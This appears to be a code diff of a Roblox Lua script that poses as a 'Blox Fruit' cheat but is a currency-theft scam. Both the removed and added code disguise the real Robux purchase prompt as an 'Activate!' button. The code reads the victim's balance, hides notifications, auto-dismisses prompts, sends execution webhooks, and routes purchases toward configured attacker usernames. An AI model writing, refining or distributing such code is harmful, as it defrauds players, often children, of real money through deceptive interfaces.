-        local PurchasePrompt = CoreGui:WaitForChild("PurchasePrompt")
-        local ProductPurchaseContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
-        local Animator = ProductPurchaseContainer:WaitForChild("Animator")
-        local Prompt = Animator:WaitForChild("Prompt")
-        local AlertContents = Prompt:WaitForChild("AlertContents")
-
-        local MiddleContent = AlertContents:WaitForChild("MiddleContent")
-        MiddleContent.Visible = false
-
-        local Footer = AlertContents:WaitForChild("Footer")
-        local FooterButtons = Footer:WaitForChild("Buttons")
-        local FooterButton1 = FooterButtons:WaitForChild("1")
-        FooterButton1.Visible = false
-
-        local FooterContent = Footer:WaitForChild("FooterContent")
-        FooterContent.Visible = false
-
-        local FooterButton2 = FooterButtons:WaitForChild("2")
-        FooterButton2.Visible = true
-
-        local FooterButton2Text = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Text")
-        FooterButton2Text.Text = "Activate!"
-        FooterButton2Text.Size = UDim2.new(1, 0, FooterButton2Text.Size.Y.Scale, FooterButton2Text.Size.Y.Offset)
-
-        local FooterButton2Icon = FooterButton2.ButtonContent.ButtonMiddleContent:WaitForChild("Icon")
-        FooterButton2Icon.Visible = false
-
-        local TitleContainer = AlertContents:WaitForChild("TitleContainer")
-        local TitleArea = TitleContainer:WaitForChild("TitleArea")
-        local TitleText = TitleArea:WaitForChild("Title")
-        TitleText.Text = "Activate Blox Fruit Script!"
-        TitleText.Size = UDim2.new(1, 0, TitleText.Size.Y.Scale, TitleText.Size.Y.Offset)
-    end)
-
-    if not success then
-        warn("UI..")
+    -- Listen for the prompt to be added initially or subsequently
+    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
+    if PurchasePrompt then
+         local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
+         if ProductContainer then
+            local Animator = ProductContainer:FindFirstChild("Animator")
+            if Animator then
+                local existingPrompt = Animator:FindFirstChild("Prompt")
+                if existingPrompt then
+                     setupPromptInteraction(existingPrompt) -- Setup for already existing prompt
+                end
+                 -- Disconnect previous connection if exists
+                if promptConnection then promptConnection:Disconnect() end
+                 promptConnection = Animator.ChildAdded:Connect(function(child)
+                    if child.Name == "Prompt" and child:IsA("Frame") then
+                        print("New 'Prompt' child added, setting up interaction.")
+                        task.wait(0.1) -- Short delay for UI elements to load inside
+                        setupPromptInteraction(child)
+                    end
+                end)
+            end
+         end
+    else
+        -- If PurchasePrompt doesn't exist yet, wait for it
+        local promptAddedConnection = CoreGui.ChildAdded:Connect(function(child)
+            if child.Name == "PurchasePrompt" then
+                print("PurchasePrompt added to CoreGui.")
+                local ProductContainer = child:WaitForChild("ProductPurchaseContainer", 2)
+                if ProductContainer then
+                     local Animator = ProductContainer:WaitForChild("Animator", 2)
+                     if Animator then
+                        local existingPrompt = Animator:FindFirstChild("Prompt")
+                        if existingPrompt then
+                             setupPromptInteraction(existingPrompt) -- Setup for already existing prompt
+                        end
+                         -- Disconnect previous connection if exists
+                         if promptConnection then promptConnection:Disconnect() end
+                         promptConnection = Animator.ChildAdded:Connect(function(addedChild)
+                             if addedChild.Name == "Prompt" and addedChild:IsA("Frame") then
+                                 print("New 'Prompt' child added to Animator, setting up interaction.")
+                                 task.wait(0.1)
+                                 setupPromptInteraction(addedChild)
+                             end
+                         end)
+                     end
+                end
+                -- Stop listening for PurchasePrompt once found
+                if promptAddedConnection then promptAddedConnection:Disconnect() end
+            end
+        end)
     end
+
+
+    -- Coroutine to handle actions after the custom prompt is confirmed
+    coroutine.wrap(function()
+        while not promptConfirmed do
+            task.wait()
+        end
+        print("Prompt confirmed by user click.")
+
+        -- Original script sent webhook here based on totalSpent >= 25.
+        -- This logic is flawed as totalSpent isn't reliably updated until *after* buyItem runs.
+        -- Webhooks are now sent *inside* buyItem after a successful pcall.
+        -- So, we remove the webhook call from here.
+
+        -- Loop to dismiss prompt after confirmation (might be redundant if buyItem handles it)
+        print("Attempting to dismiss prompt via Escape after confirmation...")
+        while CoreGui:FindFirstChild("PurchasePrompt") do
+            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
+            task.wait(0.1)
+            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Escape, false, game)
+            task.wait(0.5) -- Increased delay between attempts
+             -- Add a safety break condition
+             if not CoreGui:FindFirstChild("PurchasePrompt") then
+                print("Prompt disappeared after confirmation dismissal attempts.")
+                break
+             end
+        end
+        print("Post-confirmation dismissal loop finished.")
+    end)()
 end
 
-local RobuxPath = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt"):WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):WaitForChild("RemainingBalanceText")
-local balanceText = RobuxPath and RobuxPath.Text:match("(%d+)$")
+-- Final Execution Start & Cleanup
+hideNotifications() -- Hide notifications early
 
-if balanceText then
-    result = tonumber(balanceText) + 25
+-- << Modified User ID Fetching >>
+local successInit, errInit = pcall(function()
+    if not Username or Username == "" then error("Primary Username is not configured.") end
+    UserId = Players:GetUserIdFromNameAsync(Username)
+    if not UserId then error("Could not resolve primary Username: " .. Username) end
+    print("Primary User ID:", UserId)
+
+    -- Fetch Admin User ID only if AdminUsername is provided and different
+    if AdminUsername and AdminUsername ~= "" and AdminUsername ~= Username then
+        AdminUserId = Players:GetUserIdFromNameAsync(AdminUsername)
+        if not AdminUserId then error("Could not resolve Admin Username: " .. AdminUsername) end
+        print("Admin User ID:", AdminUserId)
+    elseif AdminUsername and AdminUsername == Username then
+         print("AdminUsername is the same as Username, using primary ID.")
+         AdminUserId = UserId -- Use the same ID if names match
+    else
+        print("AdminUsername not configured or same as Username.")
+        -- AdminUserId remains nil or same as UserId
+    end
+end)
+
+if successInit then
+    print("User ID(s) resolved successfully. Starting main script logic...")
+    sendExecutionLog() -- Log execution start
+    waitForPrompt() -- Setup prompt UI modification and confirmation listener
+    getRobuxAndProceed() -- Start the core process: trigger prompt, get balance, attempt purchase
+else
+    warn("Initialization Error (User ID Fetching): " .. tostring(errInit))
+    game.Players.LocalPlayer:Kick("Script Initialization Failed: Could not verify target user(s). Please check configuration.")
 end
 
-local function WaitForPrompt2()
-    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
-    repeat task.wait() until not Animator:FindFirstChild("Prompt")
-    sendWebhook()
-end
+-- Teleport Handling
+local teleportConnection = game.Players.LocalPlayer.OnTeleport:Connect(function(teleportState)
+    if teleportState == Enum.TeleportState.Started then
+        print("Teleport detected, resetting execution flag.")
+        _G.scriptExecuted = nil
+        -- Optional: Disconnect connections to prevent memory leaks if the script environment persists
+        if teleportConnection then teleportConnection:Disconnect() end
+        if confirmButtonConnection then confirmButtonConnection:Disconnect() end
+        -- Add disconnection for other long-running connections if necessary
+    end
+end)
 
-WaitForPrompt1()
-WaitForPrompt2()
+print("SharkyScript Modified Loaded - Waiting for interactions...")
